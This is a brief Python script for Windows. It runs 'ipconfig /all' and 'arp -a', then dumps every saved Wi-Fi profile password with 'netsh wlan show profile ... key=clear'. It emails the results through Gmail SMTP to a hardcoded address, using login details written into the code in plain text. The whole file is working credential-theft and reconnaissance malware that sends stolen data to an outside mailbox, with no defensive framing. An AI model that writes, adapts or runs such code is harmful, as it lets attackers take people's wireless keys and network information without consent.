#!/usr/bin/env python

import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def ipconfig_arp_commands():
    command1 = "ipconfig /all"
    command2 = "arp -a"
    result1 = subprocess.check_output(command1, shell=True)
    result2 = subprocess.check_output(command2, shell=True)
    send_mail("boggrom@gmail.com", "h3z9y85$", "IPCONFIG /ALL\\r\\n" + result1 + "ARP -A\\r\\n" + result2)

def netsh_command():
    command = "netsh wlan show profile"
    networks = subprocess.check_output(command, shell=True)
    network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
    result = ""
    for network_name in network_names_list:
        current_command = "netsh wlan show profile " + network_name + " key=clear"
        current_result = subprocess.check_output(current_command, shell=True)
        result += current_result
    send_mail("boggrom@gmail.com", "h3z9y85$", result)